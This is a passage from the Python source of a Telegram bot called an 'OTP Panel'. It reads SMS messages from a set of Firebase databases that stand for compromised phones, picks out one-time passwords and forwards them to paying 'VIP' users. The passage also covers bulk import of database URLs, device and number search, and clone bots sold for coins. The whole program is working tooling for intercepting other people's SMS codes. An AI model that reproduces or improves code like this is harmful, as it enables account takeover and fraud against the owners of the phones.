        msg = "✅ <b>DELETED</b>\n"
        if removed_pub:
            msg += f"🗄 Public DBs removed: {', '.join(removed_pub)}\n"
        if removed_priv:
            msg += f"🔐 Private entries removed: {removed_priv}\n"
        await reply(msg, parse_mode="HTML")
        return True

    if cmd == "/clones":
        if not CLONES:
            await reply("ℹ️ No clone bots.")
            return True
        lines = [f"🤖 <b>CLONES ({len(CLONES)})</b>", "━━━━━━━━━━━━━━━━━━"]
        now = time.time()
        for token, data in list(CLONES.items())[:20]:
            remaining = data.get("expiry", 0) - now
            if remaining <= 0:
                status = "❌ Expired"
            else:
                h = int(remaining // 3600)
                m = int((remaining % 3600) // 60)
                status = f"✅ {h}h {m}m"
            lines.append(f"🤖 @{data.get('username','unknown')}\n"
                         f"   👤 <code>{data.get('creator','?')}</code> | ⏱ {status}")
        await reply("\n".join(lines), parse_mode="HTML")
        return True

    if cmd == "/kill":
        if not args:
            await reply("⚠️ Usage: <code>/kill BOT_TOKEN</code>", parse_mode="HTML")
            return True
        token_to_kill = args[0].strip()
        if token_to_kill not in CLONES:
            await reply("❌ Token not found.")
            return True
        clone_data = CLONES[token_to_kill]
        await stop_clone_app(clone_data.get("app"))
        del CLONES[token_to_kill]
        await reply(f"✅ Killed @{clone_data.get('username','unknown')}", parse_mode="HTML")
        return True

    return False

# ════════════════════════════════════════════════════════════
#  DOCUMENT HANDLER
# ════════════════════════════════════════════════════════════

async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.document:
        return
    chat_id = update.effective_chat.id
    bot_token, is_main_bot, _, is_admin, expired = _bot_context(ctx, chat_id)
    state = pending_action.get(chat_id)
    if not state:
        return
    action = state.get("action")
    if action not in ("add_firebase_main", "add_custom_db", "add_private_db"):
        return
    if action != "add_private_db" and not is_admin:
        return
    if not is_main_bot and (bot_token not in CLONES or expired):
        return

    doc = update.message.document
    fname = (doc.file_name or "").lower()
    if not fname.endswith(".txt"):
        try:
            await update.message.reply_text("⚠️ Sirf <b>.txt</b> file upload karein (har line par ek URL).",
                                            parse_mode="HTML")
        except TelegramError:
            pass
        return

    wait = await update.message.reply_text("⏳ Reading file…")
    try:
        tg_file = await ctx.bot.get_file(doc.file_id)
        raw = await tg_file.download_as_bytearray()
        content = bytes(raw).decode("utf-8", errors="ignore")
    except Exception as e:
        try:
            await wait.edit_text(f"❌ File read failed: {str(e)[:150]}")
        except TelegramError:
            pass
        return

    urls = extract_firebase_urls(content)
    if not urls:
        try:
            await wait.edit_text(
                "⚠️ File me koi valid <code>*.firebaseio.com</code> URL nahi mila.\n"
                "Har line par ek URL hona chahiye.", parse_mode="HTML")
        except TelegramError:
            pass
        return

    if action == "add_private_db":
        pending_action.pop(chat_id)
        try:
            await wait.edit_text(f"⏳ Importing {len(urls)} private DB(s)…")
        except TelegramError:
            pass
        lines = ["🔐 <b>PRIVATE BULK IMPORT</b>", "━━━━━━━━━━━━━━━━━━"]
        for u in urls:
            ok, name, cnt = await add_private_db(chat_id, u)
            if ok:
                lines.append(f"✅ <b>{name}</b> — {cnt} devices")
            else:
                lines.append(f"❌ {name}  ({u[:45]}…)")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"📊 Your private DBs: <b>{len(PRIVATE_DBS.get(chat_id, []))}</b>  ♾️")
        result_text = "\n".join(lines)
        if len(result_text) > 4000:
            result_text = result_text[:4000] + "\n…"
        try:
            await wait.edit_text(result_text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔐 Open Private OTP", callback_data="priv_refresh")]]))
        except TelegramError:
            pass
        return

    if action == "add_custom_db":
        pending_action.pop(chat_id)
        CLONES[bot_token]["custom_db"] = urls[0]
        log_firebase_url(urls[0], chat_id, source="clone_custom")
        try:
            await wait.edit_text(
                f"✅ Custom Firebase set!\n🔗 <code>{urls[0]}</code>"
                + (f"\n\nℹ️ {len(urls) - 1} extra URLs ignored (custom DB sirf ek hota hai)."
                   if len(urls) > 1 else ""),
                parse_mode="HTML")
        except TelegramError:
            pass
        return

    pending_action.pop(chat_id)
    try:
        await wait.edit_text(f"⏳ Importing {len(urls)} database(s) — auto-naming & scanning devices…")
    except TelegramError:
        pass
    added, failed = await bulk_add_databases(urls, user_id=chat_id)
    lines = ["✅ <b>BULK IMPORT COMPLETE</b>", "━━━━━━━━━━━━━━━━━━"]
    for name, cnt in added:
        lines.append(f"🗄 <b>{name}</b> — {cnt} devices")
    skipped = len(urls) - len(added) - len(failed)
    if skipped > 0:
        lines.append(f"⏭ Skipped (duplicate/invalid): {skipped}")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append(f"🗄 Total DBs: <b>{len(DATABASES)}</b>")
    lines.append(f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}")
    result_text = "\n".join(lines)
    if len(result_text) > 4000:
        result_text = result_text[:4000] + "\n...[more]"
    try:
        await wait.edit_text(result_text, parse_mode="HTML",
                             reply_markup=InlineKeyboardMarkup(
                                 [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")]]))
    except TelegramError:
        pass

# ════════════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER
# ════════════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    bot_token, is_main_bot, users_db, is_admin, expired = _bot_context(ctx, chat_id)

    if not is_main_bot:
        if bot_token not in CLONES:
            return
        if expired:
            try:
                await update.message.reply_text("Aapka premium khatam ho gaya.")
            except TelegramError:
                pass
            return

    if users_db.get(chat_id, {}).get("banned"):
        return
    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
    if is_spamming(chat_id):
        return

    if text == "📱 Devices List":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            try:
                await update.message.reply_text(vip_lock_text(is_main_bot), parse_mode="HTML",
                                                reply_markup=vip_lock_markup(is_main_bot, chat_id))
            except TelegramError:
                pass
            return
        devices = await get_all_devices(bot_token, chat_id)
        if not devices:
            try:
                await update.message.reply_text(
                    "📭 <b>No Devices Found</b>\n━━━━━━━━━━━━━━━━━━\nAbhi koi device linked nahi hai. Kuch der baad try karein.",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 Refresh", callback_data="home")],
                        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            except TelegramError:
                pass
            return
        try:
            await update.message.reply_text(device_list_header(devices, 0),
                                            parse_mode="HTML",
                                            reply_markup=device_list_keyboard(devices, 0))
        except TelegramError as e:
            tlog(f"Devices list send failed: {e}")
        return

    if text == "🔍 Search Number":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            try:
                await update.message.reply_text(vip_lock_text(is_main_bot), parse_mode="HTML",
                                                reply_markup=vip_lock_markup(is_main_bot, chat_id))
            except TelegramError:
                pass
            return
        pending_action[chat_id] = {"action": "search_number"}
        try:
            await update.message.reply_text("🔍 Enter number to search:\n\n❌ Cancel: /cancel")
        except TelegramError:
            pass
        return

    if text == "🔐 Private OTP":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        text_view, kb = await _private_dbs_view(chat_id)
        try:
            await update.message.reply_text(text_view, parse_mode="HTML", reply_markup=kb)
        except TelegramError:
            pass
        return

    if text.startswith("🤖 Create Your Bot") and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
        req_coins = 20 + (bots_created * 10)
        user_coins = users_db.get(chat_id, {}).get("coins", 0)
        if user_coins >= req_coins:
            pending_action[chat_id] = {"action": "create_bot", "req_coins": req_coins}
            try:
                await update.message.reply_text(
                    f"🤖 <b>CREATE YOUR CLONE BOT</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"Cost: {req_coins} coins\n\nSend bot token from @BotFather.\n\n❌ Cancel: /cancel",
                    parse_mode="HTML")
            except TelegramError:
                pass
        else:
            try:
                await update.message.reply_text(
                    f"❌ Need {req_coins} coins. You have {user_coins}.",
                    reply_markup=get_vip_denied_keyboard(chat_id))
            except TelegramError:
                pass
        return

    if text == "💸 Refer & Earn" and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(
            "Share ↗️",
            url=f"https://t.me/share/url?url={ref_link}&text=Try this OTP Bot!")]])
        try:
            await update.message.reply_text(
                f"💸 <b>Refer & Earn</b>\n\n<code>{ref_link}</code>\n\n+10 coins per refer!",
                parse_mode="HTML", disable_web_page_preview=True, reply_markup=kb)
        except TelegramError:
            pass
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            try:
                await update.message.reply_text("✅ Cancelled.")
            except TelegramError:
                pass
        else:
            try:
                await update.message.reply_text("ℹ️ No pending action.")
            except TelegramError:
                pass
        return

    state = pending_action.get(chat_id)
    if not state:
        return
    action = state.get("action")

    if action == "add_private_db":
        pending_action.pop(chat_id)
        urls = extract_firebase_urls(text)
        if not urls:
            try:
                await update.message.reply_text(
                    "⚠️ Koi valid <code>*.firebaseio.com</code> URL nahi mila.\n\n"
                    "Example:\n<code>https://mydb-abc12-default-rtdb.firebaseio.com</code>",
                    parse_mode="HTML")
            except TelegramError:
                pass
            return
        wait = await update.message.reply_text(f"⏳ Adding {len(urls)} private DB(s)…")
        lines = ["🔐 <b>PRIVATE DB ADD RESULT</b>", "━━━━━━━━━━━━━━━━━━"]
        for u in urls:
            ok, name, cnt = await add_private_db(chat_id, u)
            if ok:
                lines.append(f"✅ <b>{name}</b> — {cnt} devices")
            else:
                lines.append(f"❌ {name}  ({u[:45]}…)")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"📊 Your private DBs: <b>{len(PRIVATE_DBS.get(chat_id, []))}</b>  ♾️")
        try:
            await wait.edit_text("\n".join(lines), parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔐 Open Private OTP", callback_data="priv_refresh")]]))
        except TelegramError:
            pass
        return

    if action == "add_firebase_main" and is_admin and is_main_bot:
        pending_action.pop(chat_id)
        input_text = text.strip()
        urls = extract_firebase_urls(input_text) or extract_urls(input_text)
        if not urls:
            try:
                await update.message.reply_text(
                    "⚠️ Koi valid URL nahi mila.\n\nExample:\n"
                    "<code>https://mydb-abc12-default-rtdb.firebaseio.com</code>",
                    parse_mode="HTML")
            except TelegramError:
                pass
            return
        wait = await update.message.reply_text(
            f"⏳ Adding <b>{len(urls)}</b> database(s) — auto-naming & scanning devices…",
            parse_mode="HTML")
        added, failed = await bulk_add_databases(urls, user_id=chat_id)
        lines = ["✅ <b>BULK ADD COMPLETE</b>", "━━━━━━━━━━━━━━━━━━"]
        for name, cnt in added:
            lines.append(f"🗄 <b>{name}</b> — {cnt} devices")
        skipped = len(urls) - len(added) - len(failed)
        if skipped > 0:
            lines.append(f"⏭ Skipped (duplicate/invalid): {skipped}")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"🗄 Total DBs: <b>{len(DATABASES)}</b>")
        result_text = "\n".join(lines)
        if len(result_text) > 4000:
            result_text = result_text[:4000] + "\n...[more]"
        try:
            await wait.edit_text(result_text, parse_mode="HTML",
                                 reply_markup=InlineKeyboardMarkup(
                                     [[InlineKeyboardButton("🔙 Admin Panel",
                                                            callback_data="admin_refresh")]]))
        except TelegramError:
            pass
        return

    if action == "gift_coins_all" and is_admin:
        pending_action.pop(chat_id)
        if not text.isdigit():
            try:
                await update.message.reply_text("⚠️ Number chahiye.")
            except TelegramError:
                pass
            return
        coins_to_give = int(text)
        if coins_to_give <= 0:
            try:
                await update.message.reply_text("⚠️ Amount > 0.")
            except TelegramError:
                pass
            return
        wait_msg = await update.message.reply_text(f"⏳ Sending {coins_to_give} coins...")
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)
        targets = list(users_db.keys())

        async def send_gift(uid):
            users_db[uid]["coins"] = users_db[uid].get("coins", 0) + coins_to_give
            try:
                async with _send_sem:
                    await send_bot.send_message(
                        uid, f"🎁 <b>GIFT!</b> +<b>{coins_to_give} Coins</b>",
                        parse_mode="HTML")
                return True
            except Exception:
                return False

        results = await asyncio.gather(*(send_gift(u) for u in targets),
                                       return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        try:
            await wait_msg.edit_text(
                f"✅ Sent to {sent}/{len(targets)}.\n❌ Failed: {len(targets) - sent}",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🔙 Admin", callback_data="admin_refresh")]]))
        except TelegramError:
            pass
        return

    if action == "create_bot" and is_main_bot:
        new_token = text
        req_coins = state.get("req_coins", 20)
        if not re.match(r"^\d+:[A-Za-z0-9_-]+$", new_token):
            try:
                await update.message.reply_text("⚠️ Invalid token format.")
            except TelegramError:
                pass
            return
        pending_action.pop(chat_id)
        if all_users.get(chat_id, {}).get("coins", 0) < req_coins:
            try:
                await update.message.reply_text(f"❌ Need {req_coins} coins.")
            except TelegramError:
                pass
            return
        wait_msg = await update.message.reply_text("⏳ Starting bot...")
        try:
            new_app = await start_clone_bot(new_token)
            bot_info = await new_app.bot.get_me()
            all_users[chat_id]["coins"] -= req_coins
            all_users[chat_id]["bots_created"] = \
                all_users[chat_id].get("bots_created", 0) + 1
            CLONES[new_token] = {
                "creator": chat_id, "expiry": time.time() + 86400,
                "custom_db": None, "app": new_app,
                "users": {}, "username": bot_info.username,
            }
            try:
                await wait_msg.edit_text(
                    f"✅ Bot created: @{bot_info.username}\nExpiry: 24h")
            except TelegramError:
                pass
            try:
                await update.message.reply_text(
                    "Menu:", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
            except TelegramError:
                pass
            if _main_app:
                for adm in ADMIN_IDS:
                    try:
                        await _main_app.bot.send_message(
                            adm,
                            f"🚨 <b>NEW CLONE!</b>\nCreator: <code>{chat_id}</code>\n"
                            f"Bot: @{bot_info.username}",
                            parse_mode="HTML")
                    except Exception:
                        pass
        except Exception as e:
            try:
                await wait_msg.edit_text(f"❌ Error: {e}")
            except TelegramError:
                pass
        return

    if action == "add_custom_db" and not is_main_bot and is_admin:
        custom_url = text
        if not custom_url.startswith("http"):
            try:
                await update.message.reply_text("⚠️ Invalid URL.")
            except TelegramError:
                pass
            return
        pending_action.pop(chat_id)
        CLONES[bot_token]["custom_db"] = custom_url
        log_firebase_url(custom_url, chat_id, source="clone_custom")
        try:
            await update.message.reply_text("✅ Custom Firebase set!")
        except TelegramError:
            pass
        return

    if action == "search_number":
        pending_action.pop(chat_id)
        search_term = re.sub(r"\D", "", text)
        if len(search_term) < 4:
            try:
                await update.message.reply_text("⚠️ At least 4 digits.")
            except TelegramError:
                pass
            return
        wait_msg = await update.message.reply_text("⏳ Searching...")
        devices = await get_all_devices(bot_token, chat_id)
        found_devs = [d for d in devices
                      if any(search_term in num for num in d.numbers)]
        if not found_devs:
            try:
                await wait_msg.edit_text("📭 No matches.")
            except TelegramError:
                pass
            return
        rows = []
        for d in found_devs[:10]:
            tag = f"[{d.db_tag}] "
            icon = "🟢" if d.status == "online" else "🔴"
            lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
        rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        try:
            await wait_msg.edit_text(f"🔍 {search_term}",
                                     reply_markup=InlineKeyboardMarkup(rows))
        except TelegramError:
            pass
        return

    if action == "broadcast_msg" and is_admin:
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait_msg = await update.message.reply_text(
            f"⏳ Broadcasting to {len(targets)}...")
        send_bot = await _get_send_bot(is_main_bot, bot_token, ctx.bot)

        async def send_bc(cid):
            if cid == chat_id:
                return False
            try:
                async with _send_sem:
                    await send_bot.send_message(cid, text, parse_mode="HTML")
                return True
            except Exception:
                return False

        results = await asyncio.gather(*(send_bc(cid) for cid in targets),
                                       return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        failed = len(targets) - sent - (1 if chat_id in targets else 0)
        try:
            await wait_msg.edit_text(
                f"📢 Sent: {sent}\n❌ Failed: {failed}",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🔙 Admin", callback_data="admin_refresh")]]))
        except TelegramError:
            pass
        return

# ════════════════════════════════════════════════════════════
#  FIREBASE POLLING ENGINE
# ════════════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body:
        return
    label = device_label(device)
    otp = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    kb_rows = []
    if otp:
        kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}",
                                             callback_data=f"cp:{otp}")])
    kb_rows.append([
        InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}"),
        InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{device.id}")])
    markup = InlineKeyboardMarkup(kb_rows)
    send_tasks = []
    for bot_token, chat_dict in user_focus.items():
        if bot_token != TOKEN:
            if bot_token not in CLONES or time.time() > CLONES[bot_token].get("expiry", 0):
                continue
            app_to_use = CLONES[bot_token].get("app")
            users_db = CLONES[bot_token]["users"]
        else:
            app_to_use = _main_app
            users_db = all_users
        if not app_to_use:
            continue
        target_chats = [cid for cid, did in chat_dict.items()
                        if did == device.id and is_vip(bot_token, cid)]
        for chat_id in target_chats:
            if otp:
                users_db.setdefault(chat_id, {})["otp_count"] = \
                    users_db.get(chat_id, {}).get("otp_count", 0) + 1
            send_tasks.append(
                app_to_use.bot.send_message(chat_id, msg_text,
                                            reply_markup=markup, parse_mode="HTML"))
    if send_tasks:
        await asyncio.gather(*send_tasks, return_exceptions=True)


async def _poll_sms_bulk(devices_in_db: list[Device], url: str) -> int:
    device_map = {d.id: d for d in devices_in_db}
    r_main, r_user, r_root = await asyncio.gather(
        fb_get("All_Users/sms", url), fb_get("user_sms", url),
        fb_get("sms", url), return_exceptions=True)
    forwarded = 0
    for bulk_data in (r_main, r_user, r_root):
        if not isinstance(bulk_data, dict):
            continue
        for dev_id, sms_dict in bulk_data.items():
            if not isinstance(sms_dict, dict):
                continue
            device = device_map.get(dev_id)
            for k, sms in sms_dict.items():
                if not isinstance(sms, dict):
                    continue
                sk = seen_key(dev_id, k)
                if sk in seen_ids:
                    continue
                mark_seen(sk)
                if device:
                    try:
                        await _forward_sms(device, sms)
                        forwarded += 1
                    except Exception:
                        pass
    type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
    if type4_devs:
        async def fetch_t4_sms(d: Device):
            fwd = 0
            sms_dict = await fb_get(d.sms_path, d.base_url)
            if isinstance(sms_dict, dict):
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict):
                        continue
                    sk = seen_key(d.id, k)
                    if sk in seen_ids:
                        continue
                    mark_seen(sk)
                    try:
                        await _forward_sms(d, sms)
                        fwd += 1
                    except Exception:
                        pass
            return fwd
        results = await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs),
                                       return_exceptions=True)
        forwarded += sum(r for r in results if isinstance(r, int))
    return forwarded


async def poll_single_db(tag: str, url: str) -> int:
    try:
        return await _poll_sms_bulk(GLOBAL_DEVICE_CACHE.get(tag, []), url)
    except Exception as e:
        tlog(f"poll_single_db[{tag}] recovered: {e}")
        return 0


async def refresh_private_dbs_batch() -> None:
    global _private_refresh_idx
    all_private = []
    for dbs in PRIVATE_DBS.values():
        for pdb in dbs:
            all_private.append((pdb["name"], pdb["url"]))
    if not all_private:
        return
    n = len(all_private)
    batch = [all_private[(_private_refresh_idx + i) % n]
             for i in range(min(PRIVATE_REFRESH_BATCH, n))]
    _private_refresh_idx = (_private_refresh_idx + len(batch)) % n

    async def _one(name: str, url: str):
        try:
            devs = await fetch_db_data(name, url)
            PRIVATE_DEVICE_CACHE[url] = devs
            PRIVATE_DEVICE_CACHE_TS[url] = time.time()
        except Exception:
            pass

    await asyncio.gather(*(_one(n_, u_) for n_, u_ in batch),
                         return_exceptions=True)


async def poll_private_sms() -> None:
    for dbs in list(PRIVATE_DBS.values()):
        for pdb in dbs:
            devs = PRIVATE_DEVICE_CACHE.get(pdb["url"], [])
            if not devs:
                continue
            try:
                await _poll_sms_bulk(devs, pdb["url"])
            except Exception:
                pass


async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            dbs_to_poll = dict(DATABASES)
            for c_token, c_data in CLONES.items():
                if time.time() < c_data.get("expiry", 0) and c_data.get("custom_db"):
                    dbs_to_poll[f"C_{c_token[:6]}"] = c_data["custom_db"]
            for tag, url in dbs_to_poll.items():
                try:
                    devs = await fetch_db_data(tag, url)
                    GLOBAL_DEVICE_CACHE[tag] = devs
                    GLOBAL_DEVICE_CACHE_TS[tag] = time.time()
                except Exception:
                    pass
            if first_run:
                for tag, url in dbs_to_poll.items():
                    r_main, r_user, r_root = await asyncio.gather(
                        fb_get("All_Users/sms", url), fb_get("user_sms", url),
                        fb_get("sms", url), return_exceptions=True)
                    for bulk in (r_main, r_user, r_root):
                        if not isinstance(bulk, dict):
                            continue
                        for dev_id, sms_dict in bulk.items():
                            if not isinstance(sms_dict, dict):
                                continue
                            for k in sms_dict:
                                mark_seen(seen_key(dev_id, k))
                    type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, [])
                                  if d.sms_path.endswith("receivedSms")]
                    if type4_devs:
                        async def init_t4(d: Device):
                            sms_dict = await fb_get(d.sms_path, d.base_url)
                            if isinstance(sms_dict, dict):
                                for k in sms_dict:
                                    mark_seen(seen_key(d.id, k))
                        await asyncio.gather(*(init_t4(d) for d in type4_devs),
                                             return_exceptions=True)
                first_run = False
                tlog("✅ Bot Engine ready!")
            else:
                tasks = [poll_single_db(tag, url) for tag, url in dbs_to_poll.items()]
                await asyncio.gather(*tasks, return_exceptions=True)
                await refresh_private_dbs_batch()
                await poll_private_sms()
        except asyncio.CancelledError:
            tlog("Poll loop cancelled — exiting cleanly.")
            raise
        except Exception as e:
            tlog(f"Poll loop recovered: {e}")
        await asyncio.sleep(POLL_INTERVAL)

# ════════════════════════════════════════════════════════════
#  RENDER WEBHOOK MAIN
# ════════════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN:
        raise SystemExit("❌ BOT_TOKEN env var missing!")
    if not WEBHOOK_URL:
        raise SystemExit("❌ WEBHOOK_URL env var missing! (e.g. https://your-app.onrender.com)")

    print("═" * 60)
    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION v3.7 WEBHOOK")
    print(f"  🌐 Webhook URL  : {WEBHOOK_URL}")
    print(f"  🔌 Listening on : 0.0.0.0:{PORT}")
    print("═" * 60)

    async def post_init(application: Application) -> None:
        try:
            load_data()
            await get_http_session()
            await register_commands(application)
            tlog("✅ post_init complete")
        except Exception as e:
            tlog(f"❌ post_init error: {e}")

        # Restart any live clones (only if using polling-style app behind scenes)
        for clone_token, c_data in list(CLONES.items()):
            if time.time() < c_data.get("expiry", 0):
                try:
                    tlog(f"Restarting clone: @{c_data.get('username')}")
                    clone_app = await start_clone_bot(clone_token)
                    CLONES[clone_token]["app"] = clone_app
                except Exception as e:
                    tlog(f"Failed to restart {clone_token}: {e}")

        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())

    async def post_shutdown(application: Application) -> None:
        tlog("🛑 Shutting down: closing HTTP session…")
        await close_http_session()
        await save_data_async()
        tlog("🛑 Shutdown complete. Goodbye!")

    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )
    build_handlers(app)

    # ── Render health check endpoint (keeps free tier awake) ─
    # python-telegram-bot's run_webhook already exposes /<url_path>
    # We add /healthcheck via a tiny wrapper using the same ASGI app.
    from starlette.applications import Starlette
    from starlette.responses import PlainTextResponse
    from starlette.routing import Route

    async def health_check(_request):
        return PlainTextResponse("OK", status_code=200)

    health_app = Starlette(routes=[Route("/healthcheck", health_check)])

    # Start health server in background thread/task
    import uvicorn

    async def run_health_server():
        config = uvicorn.Config(
            health_app,
            host="0.0.0.0",
            port=PORT + 1,   # Separate port so it doesn't clash with webhook
            log_level="warning",
        )
        server = uvicorn.Server(config)
        await server.serve()

    async def start_health():
        # Launch health check server on the side
        asyncio.create_task(run_health_server())

    # Register health server startup
    original_post_init = post_init
    async def post_init_with_health(application: Application) -> None:
        await original_post_init(application)
        asyncio.create_task(run_health_server())
        tlog(f"✅ Health check live on port {PORT+1}")

    # Rebuild app with combined post_init
    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .post_init(post_init_with_health)
        .post_shutdown(post_shutdown)
        .build()
    )
    build_handlers(app)

    print("🚀 Starting webhook server…")
    app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        url_path=TOKEN,
        webhook_url=f"{WEBHOOK_URL}/{TOKEN}",
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
    )


if __name__ == "__main__":
    main()